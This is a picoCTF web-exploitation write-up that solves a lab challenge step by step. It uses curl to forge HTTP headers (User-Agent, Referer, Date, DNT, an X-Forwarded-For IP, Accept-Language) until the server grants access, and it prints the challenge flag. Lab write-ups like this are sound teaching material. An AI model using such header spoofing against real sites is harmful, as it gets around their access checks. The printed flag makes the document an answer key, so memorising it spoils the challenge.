# Who are you?

- Category : Web Exploitation
- Points 100

### Description

Let me in. Let me iiiiiiinnnnnnnnnnnnnnnnnnnn http://mercury.picoctf.net:39114/

### Downloads

None

### Hints

1. It ain't much, but it's an RFC https://tools.ietf.org/html/rfc2616

## Overview

RFCs are a hard read, but very worth investing the time as they contain lots of interesting stuff.

## Steps

1. First, let's take a look at what the server gives us by loading the link into our browser.

   A meme ... but also a message telling us that only those using the official PicoBrowser can use this site. Hmmm - so, checking the RFC, we can see that we need to set User-Agent.

   So open the Chrome's dev tools to see how to change this value ... Hmmm - it's not obvious. A Google search tells us that we need a browser extension to get this to work.

   I wonder if this might be easier with _curl_

   After trying a few variations, the following worked

   ```
   curl -A "picobrowser" http://mercury.picoctf.net:39114/
   ```

2. The message is now tell us the website doesn't trust users visiting from another site.
   After a bit more reading, I think we need to set _Referrer_ ... again, we can use _curl_

   It turns out we need include the port number as well as the URL for this to work

   ```
   curl -A "picobrowser" --referer "http://mercury.picoctf.net:39114" http://mercury.picoctf.net:39114/
   ```

3. Now we are told that the service will only work in 2018.
   This took some reading, but indeed the RFC does specify a _Date_ header ... although why is beyond me.

   ```
   curl -A "picobrowser" --referer "http://mercury.picoctf.net:39114" -H "Date: Tue, 04 Dec 2018 08:12:31 GMT" http://mercury.picoctf.net:39114
   ```

4. Unsurprisingly, the website is now complains that it doesn't trust users who can be tracked.
   I couldn't find any thing pertinent within the RFC, but a wider search found a (now deprecated) _DNT_ tracker listed on [Mozilla's MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/DNT)

   ```
   curl -A "picobrowser" --referer "http://mercury.picoctf.net:39114" -H "Date: Tue, 04 Dec 2018 08:12:31 GMT" -H "DNT: 1" http://mercury.picoctf.net:39114/
   ```

5. And we still aren't there.... we now need to be 'from Sweden'. Hmmm - how are we going to do that?

   Another one that took some time to figure out ... trying the _Origin_ and _Via_ headers amongst others.

   But it turns out we can use the _X-Forwarded-For_ header ... and let's say that we are forwarding for the Swedish Government..... the domain _government.se_ resolves (from http://ipinfo.info) to 185.195.92.41

   ```
   curl -A "picobrowser" --referer "http://mercury.picoctf.net:39114" -H "Date: Tue, 04 Dec 2018 08:12:31 GMT" -H "DNT: 1" -H "X-Forwarded-For: 185.195.92.41" http://mercury.picoctf.net:39114/
   ```

6. Ahh - still not done; apparently we need to be speaking Swedish if we are in Sweden.

   The 'Accept-Language' header seems to be the way ... and a look at Wikipedia should that the language code is _sv_

   ```
   curl -A "picobrowser" --referer "http://mercury.picoctf.net:39114" -H "Date: Tue, 04 Dec 2018 08:12:31 GMT" -H "DNT: 1" -H "X-Forwarded-For: 185.195.92.41" -H "Accept-Language: sv" http://mercury.picoctf.net:39114/
   ```

7. And we are in!

   _picoCTF{http*h34d3rs_v3ry_c0Ol_much_w0w***\*\***}_

   We input this into the picoCTF window to gain the credit.

### Side Notes

None
